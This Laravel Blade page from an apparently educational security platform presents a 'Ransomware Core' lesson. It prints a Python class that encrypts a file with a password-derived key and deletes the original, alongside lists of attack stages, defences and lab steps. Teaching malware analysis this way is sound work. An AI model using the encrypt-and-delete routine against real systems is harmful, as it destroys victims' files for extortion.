@extends('layouts.app')

@section('title', 'Ransomware Core Analysis - Nexus Educational Platform')

@section('content')
<style>
    body {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        min-height: 100vh;
        font-family: 'Inter', sans-serif;
    }

    .main-container {
        background: rgba(17, 24, 39, 0.8);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        border: 1px solid rgba(75, 85, 99, 0.3);
        margin: 2rem;
        padding: 3rem;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    .tab-navigation {
        border-bottom: 2px solid rgba(239, 68, 68, 0.3);
        margin-bottom: 2rem;
    }

    .tab-btn {
        background: transparent;
        border: none;
        padding: 1rem 2rem;
        color: #9ca3af;
        font-weight: 600;
        cursor: pointer;
        border-bottom: 3px solid transparent;
        transition: all 0.3s ease;
    }

    .tab-btn.active {
        color: #ef4444;
        border-bottom-color: #ef4444;
    }

    .tab-btn:hover {
        color: #ef4444;
    }

    .tab-content {
        animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .code-block {
        background: #000000;
        border-radius: 8px;
        padding: 1.5rem;
        overflow-x: auto;
        font-family: 'Fira Code', monospace;
        border: 1px solid #ef4444;
    }

    .screenshot-gallery {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 1.5rem;
    }

    .screenshot-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1rem;
        border: 1px solid rgba(239, 68, 68, 0.3);
        transition: all 0.3s ease;
        cursor: pointer;
    }

    .screenshot-item:hover {
        transform: translateY(-5px);
        border-color: #ef4444;
        box-shadow: 0 10px 20px rgba(239, 68, 68, 0.2);
    }

    .feature-list li {
        display: flex;
        align-items: center;
        margin-bottom: 0.5rem;
    }

    .metric-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 8px;
        padding: 1rem;
        border: 1px solid rgba(239, 68, 68, 0.3);
    }

    .step {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1.5rem;
        border: 1px solid rgba(239, 68, 68, 0.3);
        margin-bottom: 1.5rem;
    }
</style>

<div class="main-container">
    <!-- Header -->
    <div class="text-center mb-8">
        <div class="flex items-center justify-center mb-4">
            <div class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center mr-6">
                <i class="fas fa-lock text-white text-3xl"></i>
            </div>
            <div>
                <h1 class="text-4xl font-bold text-white">Ransomware Core Analysis</h1>
                <p class="text-red-400 text-xl">Advanced Educational Malware Framework</p>
            </div>
        </div>
        <a href="{{ route('nexus.second-semester-phase2') }}" class="inline-flex items-center bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition-all duration-300">
            <i class="fas fa-arrow-left mr-2"></i>
            Back to Phase 2
        </a>
    </div>

    <!-- Tab Navigation -->
    <div class="tab-navigation flex flex-wrap justify-center">
        <button onclick="switchTab('overview')" class="tab-btn active" id="overview-btn">Overview</button>
        <button onclick="switchTab('technical')" class="tab-btn" id="technical-btn">Technical Details</button>
        <button onclick="switchTab('implementation')" class="tab-btn" id="implementation-btn">Implementation</button>
        <button onclick="switchTab('screenshots')" class="tab-btn" id="screenshots-btn">Screenshots</button>
    </div>

    <!-- Tab Content -->
    <div id="overview" class="tab-content">
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Description</h3>
                <p class="text-gray-300 mb-6 leading-relaxed">
                    Ransomware Core represents a sophisticated malware framework designed for educational analysis. 
                    This component demonstrates advanced encryption techniques, persistence mechanisms, and 
                    communication protocols used by modern ransomware families.
                </p>
                <h4 class="text-xl font-semibold text-red-400 mb-4">Key Features:</h4>
                <ul class="feature-list text-gray-300 space-y-3">
                    <li><i class="fas fa-lock text-red-500 mr-3"></i>AES-256 file encryption algorithm</li>
                    <li><i class="fas fa-network-wired text-red-500 mr-3"></i>C2 communication protocols</li>
                    <li><i class="fas fa-shield-alt text-red-500 mr-3"></i>Anti-analysis techniques</li>
                    <li><i class="fas fa-cog text-red-500 mr-3"></i>Registry persistence mechanisms</li>
                    <li><i class="fas fa-eye-slash text-red-500 mr-3"></i>Process hollowing capabilities</li>
                    <li><i class="fas fa-file-archive text-red-500 mr-3"></i>Multi-threaded file processing</li>
                </ul>
            </div>
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Analysis Metrics</h3>
                <div class="space-y-4">
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Threat Level</span>
                            <span class="text-red-400 font-bold text-lg">Critical</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Complexity Score</span>
                            <span class="text-red-400 font-bold text-lg">9.2/10</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Detection Difficulty</span>
                            <span class="text-orange-400 font-bold text-lg">High</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Educational Value</span>
                            <span class="text-green-400 font-bold text-lg">Excellent</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="technical" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Technical Implementation</h3>
        
        <div class="bg-gray-800 rounded-lg p-6 mb-8">
            <h4 class="text-xl font-semibold text-red-400 mb-4">AES-256 Encryption Algorithm</h4>
            <pre class="code-block text-green-400 text-sm"><code>#!/usr/bin/env python3
# Ransomware Core - Educational Implementation
import os
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class RansomwareCore:
    def __init__(self, password: bytes):
        """Initialize the ransomware with encryption key"""
        self.key = self._derive_key(password)
        self.cipher_suite = Fernet(self.key)
        
    def _derive_key(self, password: bytes) -> bytes:
        """Derive encryption key from password"""
        salt = b'ransomware_salt_2024'  # In real malware, this would be random
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key
        
    def encrypt_file(self, file_path: str) -> bool:
        """Encrypt a single file"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher_suite.encrypt(file_data)
            
            with open(file_path + '.encrypted', 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            os.remove(file_path)  # Remove original file
            return True
            
        except Exception as e:
            print(f"Encryption failed for {file_path}: {e}")
            return False
            
    def decrypt_file(self, encrypted_file_path: str) -> bool:
        """Decrypt a file (for educational recovery)"""
        try:
            with open(encrypted_file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            original_path = encrypted_file_path.replace('.encrypted', '')
            with open(original_path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)
            
            os.remove(encrypted_file_path)
            return True
            
        except Exception as e:
            print(f"Decryption failed: {e}")
            return False</code></pre>
        </div>
        
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h4 class="text-xl font-semibold text-red-400 mb-4">Attack Vector Analysis</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-red-400">Initial Access:</strong> Phishing emails, RDP exploitation</li>
                    <li><strong class="text-red-400">Execution:</strong> PowerShell scripts, malicious macros</li>
                    <li><strong class="text-red-400">Persistence:</strong> Registry keys, scheduled tasks</li>
                    <li><strong class="text-red-400">Discovery:</strong> System enumeration, network scanning</li>
                    <li><strong class="text-red-400">Collection:</strong> File system crawling, data staging</li>
                    <li><strong class="text-red-400">Impact:</strong> File encryption, data exfiltration</li>
                </ul>
            </div>
            <div>
                <h4 class="text-xl font-semibold text-red-400 mb-4">Defensive Measures</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-green-400">Prevention:</strong> Email filtering, endpoint protection</li>
                    <li><strong class="text-green-400">Detection:</strong> Behavioral analysis, file monitoring</li>
                    <li><strong class="text-green-400">Response:</strong> Network isolation, process termination</li>
                    <li><strong class="text-green-400">Recovery:</strong> Backup restoration, decryption tools</li>
                    <li><strong class="text-green-400">Mitigation:</strong> User training, patch management</li>
                    <li><strong class="text-green-400">Forensics:</strong> Incident analysis, IOC extraction</li>
                </ul>
            </div>
        </div>
    </div>

    <div id="implementation" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Educational Implementation</h3>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">1</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Environment Setup</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Configure isolated virtual environment with Windows 10 target systems and comprehensive monitoring tools. 
                Install process monitors (Process Monitor, Process Explorer), network analyzers (Wireshark), and file system 
                watchers to capture all ransomware activities in real-time.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">2</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Controlled Execution</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Execute ransomware simulation in controlled environment with test files. Monitor file system changes, 
                network communications, registry modifications, and process behavior. Document encryption patterns 
                and persistence mechanisms for educational analysis.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">3</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Analysis & Documentation</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Document behavioral patterns, create detection signatures, and develop mitigation strategies 
                based on observed attack techniques and indicators of compromise. Generate comprehensive 
                reports for cybersecurity education and training purposes.
            </p>
        </div>
    </div>

    <div id="screenshots" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Simulation Screenshots</h3>
        <div class="screenshot-gallery">
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/s1/1.png') }}" alt="Ransomware Initial Execution" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Initial Execution Phase</p>
                <p class="text-gray-500 text-xs">Ransomware deployment and initialization</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/s1/2.png') }}" alt="File Encryption Process" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">File Encryption Process</p>
                <p class="text-gray-500 text-xs">AES-256 encryption in progress</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/s1/3.png') }}" alt="Ransom Note Display" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Ransom Note Display</p>
                <p class="text-gray-500 text-xs">Victim notification and payment instructions</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/s1/4.png') }}" alt="System Impact Analysis" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">System Impact Analysis</p>
                <p class="text-gray-500 text-xs">File system modifications and damage assessment</p>
            </div>
        </div>
    </div>
</div>

<script>
function switchTab(tabName) {
    // Hide all tab contents
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(content => {
        content.classList.add('hidden');
    });
    
    // Remove active class from all buttons
    const tabButtons = document.querySelectorAll('.tab-btn');
    tabButtons.forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName).classList.remove('hidden');
    
    // Add active class to clicked button
    document.getElementById(tabName + '-btn').classList.add('active');
}

function openFullscreen(element) {
    const img = element.querySelector('img');
    const overlay = document.createElement('div');
    overlay.className = 'fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 cursor-pointer';
    overlay.innerHTML = `
        <div class="relative max-w-4xl max-h-[90vh] p-4">
            <img src="${img.src}" alt="${img.alt}" class="max-w-full max-h-full object-contain">
            <button class="absolute top-4 right-4 text-white text-3xl hover:text-gray-300 bg-black bg-opacity-50 rounded-full w-12 h-12 flex items-center justify-center">&times;</button>
        </div>
    `;
    document.body.appendChild(overlay);
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay || e.target.tagName === 'BUTTON') {
            overlay.remove();
        }
    });
}
</script>
@endsection
